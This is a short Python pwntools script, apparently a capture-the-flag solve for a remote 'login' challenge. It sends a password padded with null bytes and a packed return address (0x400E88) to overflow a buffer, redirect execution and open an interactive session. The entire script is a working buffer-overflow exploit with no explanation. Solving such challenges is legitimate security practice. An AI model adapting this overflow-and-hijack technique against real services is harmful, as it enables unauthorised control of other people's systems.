from pwn import *

context.log_level = "debug"

exe = ELF("./login")
# r = exe.process()
# gdb.attach(r)
r = remote("node4.buuoj.cn", 27468)

username = b"aaa"
password = b"2jctf_pa5sw0rd" + b"\x00" * 58 + p64(0x400E88)

r.recvuntil(b"username: ")
r.sendline(username)
r.recvuntil(b"password: ")
r.sendline(password)
r.interactive()
